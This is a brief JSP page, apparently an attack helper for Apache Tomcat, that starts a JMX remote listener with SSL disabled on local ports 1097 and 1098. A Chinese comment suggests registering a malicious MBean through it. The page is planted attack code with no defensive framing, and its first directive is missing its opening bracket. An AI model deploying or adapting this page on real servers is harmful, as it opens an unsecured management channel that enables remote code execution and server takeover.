%@ page import="org.apache.catalina.mbeans.JmxRemoteLifecycleListener" %>
<%@ page import="org.apache.catalina.LifecycleEvent" %>
<%@ page import="org.apache.catalina.deploy.NamingResourcesImpl" %>

<%
    JmxRemoteLifecycleListener jmxRemoteLifecycleListener = new JmxRemoteLifecycleListener();
    jmxRemoteLifecycleListener.setRmiBindAddress("127.0.0.1");
    jmxRemoteLifecycleListener.setRmiServerPortPlatform(1098);
    jmxRemoteLifecycleListener.setRmiRegistryPortPlatform(1097);
    jmxRemoteLifecycleListener.setRmiRegistrySSL(false);
    jmxRemoteLifecycleListener.setRmiServerSSL(false);
    NamingResourcesImpl namingResources = new NamingResourcesImpl();
    LifecycleEvent lifecycleEvent = new LifecycleEvent(namingResources, "start", "data");
    jmxRemoteLifecycleListener.lifecycleEvent(lifecycleEvent);
%>
//可以尝试远程注册恶意Mbean